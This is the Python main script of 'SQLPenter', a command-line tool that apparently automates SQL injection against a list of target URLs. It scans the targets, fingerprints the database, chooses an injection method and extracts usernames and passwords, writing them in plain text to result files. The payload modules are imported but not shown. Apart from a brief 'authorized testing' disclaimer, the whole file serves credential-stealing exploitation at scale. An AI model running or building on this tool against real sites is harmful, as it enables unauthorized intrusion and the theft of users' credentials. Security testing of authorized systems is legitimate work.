#!/usr/bin/env python3
"""
SQLPenter - Automated SQL Injection Vulnerability Scanner and Exploitation Tool

This tool is designed for authorized security testing only.
"""

import asyncio
import os
import sys
from typing import List, Dict, Any, Optional
from pathlib import Path

import typer
from loguru import logger
from rich.console import Console
from rich.panel import Panel

from core.fingerprint import DatabaseFingerprinter
from core.scanner import SQLiScanner
from core.injector import SQLiInjector
from core.extractor import DataExtractor
from core.utils import setup_logger, load_targets, create_results_dir

app = typer.Typer(help="Automated SQL Injection testing tool for authorized security assessments")
console = Console()

# Banner display
BANNER = """
███████╗ ██████╗ ██╗     ██████╗ ███████╗███╗   ██╗████████╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████╗██║   ██║██║     ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝
╚════██║██║▄▄ ██║██║     ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗██║     ███████╗██║ ╚████║   ██║   ███████╗██║  ██║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                     SQL Injection Testing Framework
              Use only on systems you have permission to test!
"""


@app.command()
def scan(
    targets: str = typer.Option(
        "targets.txt", "--targets", "-t", help="Path to targets file (one URL per line)"
    ),
    concurrency: int = typer.Option(
        10, "--concurrency", "-c", help="Number of concurrent requests"
    ),
    timeout: int = typer.Option(
        5, "--timeout", "-to", help="Request timeout in seconds"
    ),
    log_level: str = typer.Option(
        "INFO", "--log-level", "-l", help="Logging level (DEBUG, INFO, WARNING, ERROR)"
    ),
    headers_file: Optional[str] = typer.Option(
        None, "--headers", "-H", help="Path to custom headers JSON file"
    ),
    proxy: Optional[str] = typer.Option(
        None, "--proxy", "-p", help="Proxy URL (e.g., http://127.0.0.1:8080)"
    ),
    verbose: bool = typer.Option(
        False, "--verbose", "-v", help="Enable verbose output"
    ),
    delay: float = typer.Option(
        0.0, "--delay", "-d", help="Delay between requests in seconds"
    ),
):
    """
    Scan targets for SQL injection vulnerabilities and extract data if found.
    """
    # Display banner
    console.print(Panel(BANNER, border_style="blue", expand=False))
    
    # Setup logging
    log_level = log_level.upper()
    setup_logger(log_level, verbose)
    
    # Create results directory
    results_dir = create_results_dir()
    logger.info(f"Results will be saved to {results_dir}")
    
    # Load targets
    targets_list = load_targets(targets)
    if not targets_list:
        logger.error(f"No targets found in {targets}")
        return
    
    logger.info(f"Loaded {len(targets_list)} target(s) from {targets}")
    
    # Setup configuration
    config = {
        "concurrency": concurrency,
        "timeout": timeout,
        "headers_file": headers_file,
        "proxy": proxy,
        "delay": delay,
        "results_dir": results_dir,
    }
    
    # Run the main scanning loop
    asyncio.run(run_scanner(targets_list, config))
    
    logger.info("Scan completed. Check results directory for findings.")


async def run_scanner(targets: List[str], config: Dict[str, Any]) -> None:
    """
    Main scanning function that orchestrates the whole process.
    
    Args:
        targets: List of target URLs to scan
        config: Configuration dictionary for the scanner
    """
    # Initialize components
    scanner = SQLiScanner(config)
    fingerprinter = DatabaseFingerprinter(config)
    injector = SQLiInjector(config)
    extractor = DataExtractor(config)
    
    # Create a summary file
    summary_path = Path(config["results_dir"]) / "summary.txt"
    with open(summary_path, "w") as summary_file:
        summary_file.write("SQLPenter Scan Summary\n")
        summary_file.write("=====================\n\n")
    
    # Process each target
    for target_url in targets:
        try:
            logger.info(f"Starting scan for: {target_url}")
            
            # Create results file for this target
            hostname = target_url.split("//")[-1].split("/")[0].replace(":", "_")
            result_file = Path(config["results_dir"]) / f"{hostname}.txt"
            
            # Check for injectable parameters
            injectable_params = await scanner.scan_url(target_url)
            if not injectable_params:
                logger.info(f"No injectable parameters found for {target_url}")
                continue
                
            # Process each injectable parameter
            for param_info in injectable_params:
                # Fingerprint the database
                db_type = await fingerprinter.identify_dbms(target_url, param_info)
                logger.info(f"Detected DBMS: {db_type}")
                
                # Determine injection method
                injection_type = await injector.find_injection_method(target_url, param_info, db_type)
                if not injection_type:
                    logger.warning(f"Could not determine viable injection method for {param_info['param']}")
                    continue
                    
                logger.info(f"Using {injection_type} injection method")
                
                # Extract data
                credentials = await extractor.extract_credentials(
                    target_url, param_info, db_type, injection_type
                )
                
                if credentials:
                    # Write results to file
                    with open(result_file, "w") as f:
                        f.write(f"[+] URL: {target_url}\n")
                        f.write(f"[+] DBMS: {db_type}\n")
                        f.write(f"[+] Injection Type: {injection_type}\n")
                        f.write(f"[+] Vulnerable Parameter: {param_info['param']}\n")
                        f.write("[+] Extracted Data:\n")
                        for username, password in credentials:
                            f.write(f"    username: {username}\n")
                            f.write(f"    password: {password}\n")
                    
                    # Update summary
                    with open(summary_path, "a") as summary_file:
                        summary_file.write(f"Target: {target_url}\n")
                        summary_file.write(f"DBMS: {db_type}\n")
                        summary_file.write(f"Injection Type: {injection_type}\n")
                        summary_file.write(f"Vulnerable Parameter: {param_info['param']}\n")
                        summary_file.write("Credentials Found: Yes\n\n")
                    
                    logger.success(f"Vulnerability found and exploited in {target_url}")
                else:
                    logger.warning(f"Could not extract credentials from {target_url}")
                    
                    # Update summary
                    with open(summary_path, "a") as summary_file:
                        summary_file.write(f"Target: {target_url}\n")
                        summary_file.write(f"DBMS: {db_type}\n")
                        summary_file.write(f"Injection Type: {injection_type}\n")
                        summary_file.write(f"Vulnerable Parameter: {param_info['param']}\n")
                        summary_file.write("Credentials Found: No\n\n")
        
        except Exception as e:
            logger.error(f"Error processing {target_url}: {e}")
            continue


if __name__ == "__main__":
    app()